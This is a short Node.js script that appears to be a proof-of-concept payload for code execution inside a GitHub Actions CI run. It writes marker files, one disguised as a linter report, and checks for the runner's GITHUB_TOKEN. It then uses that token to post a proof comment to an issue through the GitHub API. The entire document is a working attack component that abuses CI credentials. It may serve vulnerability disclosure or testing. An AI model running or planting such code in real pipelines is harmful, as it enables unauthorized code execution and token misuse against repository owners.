const fs = require('fs');
const marker = 'RCE_REALCHAIN_' + Date.now();
console.log('RCE_MARKER_EXECUTED ' + marker);
console.log('TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
const ws = process.env.GITHUB_WORKSPACE || process.cwd();
try {
  fs.writeFileSync(ws + '/linter-report.txt', 'RCE_CONFIRMED_BY_CODE_EXECUTION ' + marker + '\n');
  fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
} catch (e) { console.log('write failed: ' + e.message); }
(async () => {
  try {
    const t = process.env.GITHUB_TOKEN;
    if (!t) return;
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/2/comments', {
      method: 'POST',
      headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
      body: JSON.stringify({ body: 'REALCHAIN_TOKEN_PROOF ' + marker })
    });
    console.log('token_comment_status=' + r.status);
  } catch (e) { console.log('token comment failed: ' + e.message); }
})();
